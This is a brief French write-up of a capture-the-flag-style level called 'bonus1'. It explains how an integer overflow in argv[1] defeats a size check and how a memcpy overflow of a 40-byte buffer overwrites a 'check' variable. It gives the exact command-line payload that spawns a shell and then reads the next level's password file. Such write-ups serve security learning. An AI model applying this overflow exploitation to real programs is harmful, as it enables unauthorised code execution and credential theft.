## bonus1
- Le [code source](source.c) permet de mieux repérer la faille :
    - `check` doit d'abord être inférieur à 10, mais aussi avoir une valeur suffisamment grande pour permettre le bon fonctionnement du `memcpy`. Pour répondre à ces deux conditions simultanément, il faut passer par un [*integer overflow*](https://en.wikipedia.org/wiki/Integer_overflow).
    - Ensuite, on sait que dans la mémoire `check` se situe juste après le `buffer` de 40 octets. Il faudra donc profiter du `memcpy` pour écraser la valeur de `check`
- Notre exploit doit s'appuyer sur `argv[1]` et `argv[2]`
    - Dans `argv[1]`, il suffit de mettre un nombre négatif suffisamment petit pour exploiter l'overflow => `-2147483624`
    - Dans `argv[2]`, on va placer d'abord placer 40 caractères de remplissage, puis la valeur de vérification de `check` : `python -c 'print "\x90"*40 + "\x46\x4c\x4f\x57"'`
- ``./bonus1 -2147483624 `python -c 'print "\x90"*40 + "\x46\x4c\x4f\x57"'` `` nous lance le *shell*. `cat /home/user/bonus2/.pass` pour obtenir le *flag*.